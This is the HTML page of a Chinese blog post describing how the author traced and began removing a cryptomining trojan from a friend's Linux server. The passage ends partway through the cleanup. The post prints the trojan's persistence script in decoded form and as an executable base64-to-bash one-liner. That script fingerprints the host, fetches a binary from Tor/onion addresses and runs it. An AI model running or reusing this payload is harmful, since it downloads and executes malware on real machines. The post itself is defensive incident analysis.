@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="referrer" content="no-referrer" />
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">
+  <meta name="baidu-site-verification" content="DZuSb7rHBzd9CBVO">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    save_scroll: false,
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="背景最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程 现象 首先是某云服务器控制台给出了性能受限警告   分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马  然后是网站（个人博客）无法访问">
+<meta name="keywords" content="linux,挖矿木马,服务器,运维">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次帮师兄解决服务器挖矿木马的过程">
+<meta property="og:url" content="https://blog.zimo.wiki/posts/e2d5f670/index.html">
+<meta property="og:site_name" content="子墨的博客">
+<meta property="og:description" content="背景最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程 现象 首先是某云服务器控制台给出了性能受限警告   分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马  然后是网站（个人博客）无法访问">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-20-41-20.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-20-46-16.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-09-20.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-14-43.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-16-47.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-20-12.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-27-11.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-31-11.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-21-55-58.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-01-25.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-08-35.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-10-18.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-21-48.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-23-48.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-38-06.png">
+<meta property="og:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-22-40-31.png">
+<meta property="og:updated_time" content="2022-05-04T02:56:01.498Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次帮师兄解决服务器挖矿木马的过程">
+<meta name="twitter:description" content="背景最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程 现象 首先是某云服务器控制台给出了性能受限警告   分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马  然后是网站（个人博客）无法访问">
+<meta name="twitter:image" content="https://blog.zimo.wiki/posts/e2d5f670/2021-03-28-20-41-20.png">
+  <link rel="alternate" href="/atom.xml" title="子墨的博客" type="application/atom+xml">
+  <link rel="canonical" href="https://blog.zimo.wiki/posts/e2d5f670/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>记一次帮师兄解决服务器挖矿木马的过程 | 子墨的博客</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?7f74197855659515fce98a69a3bcd36f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+    <script type="text/javascript" src="/js/anime.min.js"></script> 
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">子墨的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">总得让实力配上野心</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">71</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">16</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">29</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+</div>
+    </header>
+
+    
+
+  <a href="https://github.com/ZimoLoveShuang" class="github-corner" title="Follow me on Github" aria-label="Follow me on Github" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.zimo.wiki/posts/e2d5f670/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="子墨">
+      <meta itemprop="description" content="子墨的博客">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子墨的博客">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">记一次帮师兄解决服务器挖矿木马的过程
+
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-thumb-tack"></i>
+              </span>
+              <span class="post-meta-item-text"></span>
+              <time title="置顶" itemprop="置顶" datetime="2021-03-28T12:35:26+00:00" style="color:#7D26CD;">置顶</time>
+             </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2021-03-28 20:35:26" itemprop="dateCreated datePublished" datetime="2021-03-28T20:35:26+08:00">2021-03-28</time>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux/ubantu/" itemprop="url" rel="index"><span itemprop="name">ubantu</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>12k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>11 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖矿木马斗争的过程</p>
+<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><ol>
+<li><p>首先是某云服务器控制台给出了性能受限警告<br> <img src="/posts/e2d5f670/2021-03-28-20-41-20.png" alt></p>
+<p> 分析：师兄的服务器看起来貌似就只挂了个网站，一个mysql数据库，不至于遇到性能受限的情况，因此CPU持续的被占用这么高的情况，十有八九中了挖矿木马</p>
+</li>
+<li><p>然后是网站（个人博客）无法访问<br> <img src="/posts/e2d5f670/2021-03-28-20-46-16.png" alt></p>
+<p> 分析：这张图片看起来像阿里cdn禁止访问的图片，因此分析应该是套了一层cdn，禁止直接使用ip访问，后期经过验证，果然如此，使用域名是可以访问的，但是出现了css样式加载不出来的问题，我猜大概率是因为https证书过期了，一些内容无法经过cdn加载出来，希望师兄尽快去处理一下</p>
+</li>
+</ol>
+<h2 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h2><p>经过上面的分析，网站挂马应该是不存在的，不过也不排除是网站漏洞导致反弹了shell，从而被挂上木马的（建议师兄仔细看一下后台有没有鉴权或者未授权访问漏洞以及远程代码执行漏洞，尤其是文件上传的接口部分，更要仔细排查），为什么我会得出这样的结论呢？因为我把他的网站源码down了下来，使用某web扫描引擎，扫描了一遍，结论是没有发现明显的木马，我自己也大概的扫了一下，确实是没有明显的跳转到其他链接和其他比较明显的木马文件之类的。<strong>所以，接下来就只剩这个疑似中了挖矿木马的情况了</strong></p>
+<h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><h3 id="定位木马"><a href="#定位木马" class="headerlink" title="定位木马"></a>定位木马</h3><p>首先使用<code>top</code>命令，查看一下当前的CPU占用情况<br><img src="/posts/e2d5f670/2021-03-28-21-09-20.png" alt></p>
+<p>可以看到<code>aLZmFuXY</code>这个进程一直在占用着CPU的资源，很明显就是罪魁祸首</p>
+<p>于是尝试，全局搜索一下看看，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -iname aLZmFuXY</span><br></pre></td></tr></table></figure>
+
+<p>好吧，看来不是这么明显的，什么都没有搜到<br><img src="/posts/e2d5f670/2021-03-28-21-14-43.png" alt></p>
+<p>然后，尝试直接kill掉这个进程试试，先执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep aLZmFuXY</span><br></pre></td></tr></table></figure>
+
+<p>定位到进程，然后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 6283</span><br></pre></td></tr></table></figure>
+
+<p>尝试杀掉进程，没想到，直接断开了<code>ssh</code>连接，看来这个木马还有点顽固，猜想肯定有某种重启或者定时执行的机制<br><img src="/posts/e2d5f670/2021-03-28-21-16-47.png" alt></p>
+<p>于是，重新蓝（<s>连</s>）上<code>ssh</code>，再次查看CPU使用情况</p>
+<p><img src="/posts/e2d5f670/2021-03-28-21-20-12.png" alt></p>
+<p>果不其然，它（<code>aLZmFuXY</code>）又回来（自动启动）了</p>
+<p>现在我们尝试去搞懂<code>木马</code>的启动机制，经过上面的分析和实验，我们可以知道，这个<code>挖矿的木马程序</code>应该是有自启动和重启机制的，于是，我们可以从这里入手，使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<p>查看所有的定时任务，发现只有一个<code>/root/.systemd-service.sh</code>，那铁定就是它在捣鬼，等等，好像有什么细节被我们忽略了？？？想不起来，先放一下（其实是在<code>top</code>命令的执行结果那里，捣蛋鬼<code>systemd</code>总是和我们的木马进程<code>aLZmFuXY</code>一起出现的）</p>
+<p><img src="/posts/e2d5f670/2021-03-28-21-27-11.png" alt></p>
+<p>现在我们来看一下，这个捣蛋鬼脚本到底写了什么，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.systemd-service.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-21-31-11.png" alt></p>
+<p>发现是一堆<code>base64</code>编码之后的脚本，我们尝试解码看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line">$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r</span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su </span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>好了，有了源代码的佐证，现在我们终于可以确定，这个捣蛋鬼就是一个活生生的<strong>挖矿木马</strong>，别问我怎么确定的（tor2web都出来了，这还不够明显吗？？？）</p>
+<p>附上源文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash</span><br></pre></td></tr></table></figure>
+
+<p>现在我们来仔细分析一下<code>/root/.systemd-service.sh</code>这个文件的内容（当然是解码之后的内容啦，没解码谁看得懂。。。），不过，要说声抱歉的是，<code>shell</code>我也不懂，就看懂个大概吧（大佬勿喷），大概就是监测挖矿进程是否在线，在线就一直连接socket，一直挖，一直挖，不在线就利用守护进程去启动它，然后还是一直挖，一直挖，一直挖。。。着实有点过分，怪不得那么吃资源，这简直丧心病狂。不得不提的是，脚本中有一个目录很值得我们注意一下，就是<code>/tmp/.X11-unix/</code>，这个就是挖矿进程和守护进程所在的地方，我们去看一下，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /tmp/.X11-unix/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-21-55-58.png" alt></p>
+<p>可以看到，有三个文件，查看这三个文件（<code>01、11、22</code>）的内容可以看到是几个数字，功能如下：</p>
+<ul>
+<li><code>01</code>文件存放木马守护进程<code>pid</code></li>
+<li><code>11</code>文件存放木马运行进程<code>pid</code></li>
+<li><code>22</code>为一个空文件，功能暂时不清楚</li>
+</ul>
+<p><img src="/posts/e2d5f670/2021-03-28-22-01-25.png" alt></p>
+<p>分析就到这里了，下面是解决木马篇</p>
+<h3 id="干掉木马"><a href="#干掉木马" class="headerlink" title="干掉木马"></a>干掉木马</h3><p>为了防止分析过程有所疏忽，有必要再次进行一下全局搜索，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -iname systemd-service.sh</span><br><span class="line">find / -iname .systemd-service.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-22-08-35.png" alt></p>
+<p>果然，我们有所遗漏，<code>/opt/systemd-service.sh</code>这就是我们之前没有发现的，现在我们来看一下它又是什么，执行</p>
